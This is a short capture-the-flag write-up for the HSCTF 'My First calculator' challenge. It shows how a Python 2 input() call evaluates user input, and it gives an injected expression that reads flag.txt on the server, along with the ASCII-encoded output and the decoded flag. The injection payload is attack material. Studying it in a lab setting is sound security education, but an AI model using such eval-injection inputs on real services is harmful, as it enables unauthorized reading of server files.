# My First calculator

Category: Misc

Points: 100

>  I'm really new to python. Please don't break my calculator!`nc misc.hsctf.com 7001`
>
> There is a `flag.txt` on the server.

A [`calculator.py`](calculator.py) is attached. The script uses python 2, which has plenty of exploitable bugs.

The script uses the `input` function which [is equivalent to `eval(raw_input())`](https://docs.python.org/2/library/functions.html#input). 

```python
first = int(input("First number: "))
second = int(input("Second number: "))
```

These variables are printed due to a logic error in the script:

```python
if first != 1 or second != 1:
    print("")
    print("Sorry, only the number 1 is supported")
```
If the check fails, the script proceeds anyway.

Hence, we can encode the flag into ASCII, then decode it later.

```python
first = ''.join(str(ord(c)) for c in open("flag.txt","r").read())
second = 1
operator = "anything"
```

Output:

```
102108971031231121081019711510195117115101951121211161041111105112511
```

With some effort, we can split the output into ASCII characters:

```
102 108 97 103 123 112 108 101 97 115 101 95 117 115 101 95 112 121 116 104 111 110 51 125 11
flag{please_use_python3}
```

